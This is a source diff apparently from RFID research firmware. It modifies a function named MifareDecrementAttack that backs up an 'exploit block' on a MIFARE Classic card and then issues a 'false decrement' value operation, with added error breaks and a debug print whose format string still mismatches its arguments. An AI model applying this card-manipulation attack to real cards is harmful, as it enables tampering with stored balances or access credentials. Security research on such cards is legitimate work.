@@ -658,6 +658,9 @@ void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     uint8_t blockdata[16] = {0x00};
     memcpy(blockdata, datain + 14, 16);
 
+    // Empty increment value
+    uint8_t incrementValue[16] = {0x00};
+
     // variables
     uint8_t isOK = 0;
     uint8_t uid[10] = {0x00};
@@ -666,7 +669,7 @@ void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     struct Crypto1State *pcs;
     pcs = &mpcs;
 
-    Dbprintf("datain: %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u", datain[0], datain[1], datain[2], datain[3], datain[4], datain[5], datain[6], datain[7], datain[8], datain[9], datain[10], datain[11], datain[12], datain[13], datain[14], datain[15], datain[16], datain[17], datain[18], datain[19], datain[20], datain[21], datain[22], datain[23], datain[24], datain[25], datain[26], datain[27], datain[28], datain[29], datain[30]);
+    Dbprintf("datain: %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u", datain[0], datain[1], datain[2], datain[3], datain[4], datain[5], datain[6], datain[7], datain[8], datain[9], datain[10], datain[11], datain[12], datain[13], datain[14], datain[15], datain[16], datain[17], datain[18], datain[19], datain[20], datain[21], datain[22], datain[23], datain[24], datain[25], datain[26], datain[27], datain[28], datain[29], datain[30]);
     
     iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
 
@@ -690,7 +693,7 @@ void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth error");
             break;
         };
-
+        
         Dbprintf("Backup exploit block");
         if (mifare_classic_readblock(pcs, cuid, blockExploitno, dataoutbuf)) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Read block error");
@@ -703,10 +706,11 @@ void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
             Dbprintf("Write ok");
         } else if (res) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+            break;
         }
-
+        
         Dbprintf("False decrement to exploit block");
-        if (mifare_classic_value(pcs, cuid, blockExploitno, 0x00, 0x01)) {
+        if (mifare_classic_value(pcs, cuid, blockExploitno, incrementValue, 0x01)) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Write decrement block error");
             break;
         };
@@ -746,6 +750,7 @@ void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
             Dbprintf("Write ok");
         } else if (res) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+            break;
         }
 
         if (mifare_classic_halt(pcs, cuid)) {
